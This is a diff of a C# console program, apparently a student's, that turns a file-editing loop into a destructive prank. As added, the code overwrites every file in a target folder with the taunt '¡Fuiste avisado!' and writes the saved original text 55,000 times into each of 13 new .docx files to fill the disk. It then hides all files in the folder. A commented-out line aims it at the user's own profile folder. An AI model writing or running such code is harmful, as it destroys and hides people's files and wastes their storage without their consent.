@@ -1,39 +1,29 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
+
 using System.IO;
-using System.Collections;
 
 namespace ConsoleApplication1
 {
     class Program
     {
-        //static readonly string textFile = @"C:\Users\alumno\Desktop\file0.txt";
-
-        // static readonly string textFile = @"C:\Users\alumno\UNDERTALE\file01.odt";
-            
-
-        static void Main(string[] args)
+        static void Main()
         {
 
-            // ArrayList aux = new ArrayList();
+            //DirectoryInfo direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\UNDERTALE");
 
-            //string textFile = @"C:\Users\alumno\UNDERTALE\file01.odt";
+            string aux = "", texto = @"¡Fuiste avisado! ¯\_(ツ)_/¯";
 
-            string textFile = @"C:\Users\" + Environment.UserName + @"\UNDERTALE\file01.docx";
+            //string rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\UNDERTALE";
 
-            // string textFile = @"C:\Users\" + Environment.UserName + @"\UNDERTALE";
+            DirectoryInfo direccion = new DirectoryInfo(@"D:\Cole 2019\UNDERTALE");
 
-            //DirectoryInfo Dif = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\UNDERTALE");
+            string rutaPrincipal = @"D:\Cole 2019\UNDERTALE";
 
-            StreamReader sr = new StreamReader(textFile, Encoding.Unicode);
+            string rutaCompleta;
 
-            string salir = "n";
+            int cont=0;
 
-            string aux = "";
-
-            bool primeraVez = true;
+            bool unaVez = true, entra = true;
 
             do
             {
@@ -42,116 +32,66 @@ namespace ConsoleApplication1
 
                 Console.WriteLine("Ejecutando...");
 
-               // salir = Console.ReadLine();
+                cont++;
 
-                string texto = "Soy una almeja";
+                rutaCompleta = rutaPrincipal + @"\te_lo_dije" + cont + ".docx";
 
-                //int cont = 0;
-
-                string tex = File.ReadAllText(textFile); //Lee todo lo que tiene el archivo y lo guarda en la variable.
-
-                // foreach (string line in lines)
-                //{
-
-                //cont++;
-
-                //aux.Add(line);
-
-                sr.Close();
-
-                if (primeraVez==true)
+                if (entra == true)
                 {
 
-                    aux = tex; //aux guarda los valores originales.
+                    if (direccion.GetFiles().Length == 0)
+                    {
 
-                    File.WriteAllText(textFile, texto);
+                        aux = texto;
 
-                   // tex = tex.Replace(tex, texto); //se reemplaza lo original por la palabra clave.
+                    }
+                    else
+                    {
 
-                    primeraVez = false;
+                        foreach (FileInfo file in direccion.GetFiles())
+                        { 
+                            if (unaVez == true)
+                            {
+
+                                aux = File.ReadAllText(file.FullName); //aux guarda los valores originales.
+
+                                unaVez = false;
+
+                            }
+
+                            File.WriteAllText(file.FullName, texto);
+
+                        }
+
+                    }
+
+                    entra = false;
 
                 }
 
-                if (salir == "d")
+                using (StreamWriter archivo = File.AppendText(rutaCompleta))         //se crea el archivo
                 {
 
-                    File.WriteAllText(textFile, aux); //se reemplaza la palabra clave por el texto original
+                    for (int i = 0; i < 55000; i++)
+                    {
 
-                    File.GetAttributes(textFile);
+                        archivo.Write(aux);
 
+                    }
+
+                    archivo.Close();
+                    
                 }
 
-                if (salir == "o")
-                {
+            } while(cont <= 12);
 
-                   // Dif.CreateSubdirectory();
+            foreach (FileInfo file in direccion.GetFiles())
+            {
 
-                    //File.SetAttributes(textFile, FileAttributes.Hidden);
-
-                }
-
-                //File.WriteAllText(textFile, tex); //se escribe
-
-                // aux = aux.ToLower();
-                //string archivoTexto = File.ReadAllText(textFile);
-
-
-                //File.WriteAllText(@"C:\Users\alumno\UNDERTALE\file01.odt", archivoTexto);
-
-
-
-
-
-
-                /* if (salir == "d")
-                 {
-
-                     archivoTexto = archivoTexto.Replace(texto, aux.);
-
-                 }*/
-                //  }
-
-                // int i = 0;
-                //int cont = 0;
-                /* string[] lines = File.ReadAllLines(textFile);
-                 foreach (string line in lines)
-                 {
-                     cont++;
-                     string aux = line;
-                     aux = aux.ToLower();
-                     if (aux.IndexOf(texto) != -1)
-                     {
-                         cont++;
-                     }
-
-                         
-
-
-
-                         /* using (StreamWriter file = new StreamWriter(@"C:\Users\alumno\UNDERTALE\file01.txt", true))
-                              {
-                                  file.WriteLine("ANDA"); //se agrega información al documento
-
-                                  file.Close();
-                              }
-                              */
-                /* using (StreamWriter file = new StreamWriter(@"C:\Users\alumno\UNDERTALE\file01.odt", true))
-                 {
-                     file.WriteLine("ANDA"); //se agrega información al documento
-
-                     file.Close();
-                 }
-
+                File.SetAttributes(file.FullName, FileAttributes.Hidden);
 
             }
-            Console.WriteLine("Lineas total leidas: "+i+" / Coincidencias: "+cont);
 
-         */
-
-                Console.WriteLine("Desea salir? s/n ");
-                salir = Console.ReadLine();
-
-            }while(salir != "s");
         }
     }
 }
